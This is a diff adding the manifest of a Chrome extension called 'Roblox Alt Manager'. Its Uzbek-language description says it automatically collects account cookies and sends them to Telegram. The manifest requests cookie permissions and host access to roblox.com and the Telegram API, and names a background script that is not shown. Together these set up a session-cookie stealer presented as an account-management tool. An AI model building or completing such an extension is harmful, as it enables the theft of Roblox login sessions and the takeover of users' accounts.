@@ -1,0 +1,18 @@
+{
+  "manifest_version": 3,
+  "name": "Roblox Alt Manager",
+  "version": "1.0",
+  "description": "Alt akkauntlar kukilarini avtomatik yig'uvchi va Telegramga yuboruvchi kengaytma",
+  "permissions": [
+    "cookies",
+    "storage",
+    "alarms"
+  ],
+  "host_permissions": [
+    "https://*.roblox.com/*",
+    "https://api.telegram.org/*"
+  ],
+  "background": {
+    "service_worker": "background.js"
+  }
+}
